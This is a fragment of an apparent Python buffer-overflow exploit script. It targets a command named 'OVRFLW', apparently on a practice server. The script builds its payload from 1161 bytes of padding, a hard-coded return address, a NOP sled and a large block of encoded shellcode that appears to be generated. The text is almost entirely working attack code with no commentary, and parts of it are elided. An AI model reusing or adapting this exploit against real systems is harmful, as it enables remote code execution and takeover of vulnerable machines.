...
cmd = "OVRFLW "
junk = "\x41" * 1161
offset = "\x83\x66\x52\x56"
nopsled = "\x90" * 0x20

shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xae\x10\xba\x19\x83\xee\xfc"
shellcode += b"\xe2\xf4\x52\xf8\x38\x19\xae\x10\xda\x90\x4b"
shellcode += b"\x21\x7a\x7d\x25\x40\x8a\x92\xfc\x1c\x31\x4b"
shellcode += b"\xba\x9b\xc8\x31\xa1\xa7\xf0\x3f\x9f\xef\x16"
shellcode += b"\x25\xcf\x6c\xb8\x35\x8e\xd1\x75\x14\xaf\xd7"
shellcode += b"\x58\xeb\xfc\x47\x31\x4b\xbe\x9b\xf0\x25\x25"
shellcode += b"\x5c\xab\x61\x4d\x58\xbb\xc8\xff\x9b\xe3\x39"
shellcode += b"\xaf\xc3\x31\x50\xb6\xf3\x80\x50\x25\x24\x31"
shellcode += b"\x18\x78\x21\x45\xb5\x6f\xdf\xb7\x18\x69\x28"
shellcode += b"\x5a\x6c\x58\x13\xc7\xe1\x95\x6d\x9e\x6c\x4a"
shellcode += b"\x48\x31\x41\x8a\x11\x69\x7f\x25\x1c\xf1\x92"
shellcode += b"\xf6\x0c\xbb\xca\x25\x14\x31\x18\x7e\x99\xfe"
shellcode += b"\x3d\x8a\x4b\xe1\x78\xf7\x4a\xeb\xe6\x4e\x4f"
shellcode += b"\xe5\x43\x25\x02\x51\x94\xf3\x78\x89\x2b\xae"
shellcode += b"\x10\xd2\x6e\xdd\x22\xe5\x4d\xc6\x5c\xcd\x3f"
shellcode += b"\xa9\xef\x6f\xa1\x3e\x11\xba\x19\x87\xd4\xee"
shellcode += b"\x49\xc6\x39\x3a\x72\xae\xef\x6f\x49\xfe\x40"
shellcode += b"\xea\x59\xfe\x50\xea\x71\x44\x1f\x65\xf9\x51"
shellcode += b"\xc5\x2d\x73\xab\x78\x7a\xb1\xbd\x2f\xd2\x1b"
shellcode += b"\xae\x01\xe6\x90\x48\x7a\xaa\x4f\xf9\x78\x23"
shellcode += b"\xbc\xda\x71\x45\xcc\x2b\xd0\xce\x15\x51\x5e"
shellcode += b"\xb2\x6c\x42\x78\x4a\xac\x0c\x46\x45\xcc\xc6"
shellcode += b"\x73\xd7\x7d\xae\x99\x59\x4e\xf9\x47\x8b\xef"
shellcode += b"\xc4\x02\xe3\x4f\x4c\xed\xdc\xde\xea\x34\x86"
shellcode += b"\x18\xaf\x9d\xfe\x3d\xbe\xd6\xba\x5d\xfa\x40"
shellcode += b"\xec\x4f\xf8\x56\xec\x57\xf8\x46\xe9\x4f\xc6"
shellcode += b"\x69\x76\x26\x28\xef\x6f\x90\x4e\x5e\xec\x5f"
shellcode += b"\x51\x20\xd2\x11\x29\x0d\xda\xe6\x7b\xab\x4a"
shellcode += b"\xac\x0c\x46\xd2\xbf\x3b\xad\x27\xe6\x7b\x2c"
shellcode += b"\xbc\x65\xa4\x90\x41\xf9\xdb\x15\x01\x5e\xbd"
shellcode += b"\x62\xd5\x73\xae\x43\x45\xcc"




#junk += ""
...
buffer = cmd + junk + offset + nopsled + shellcode + end
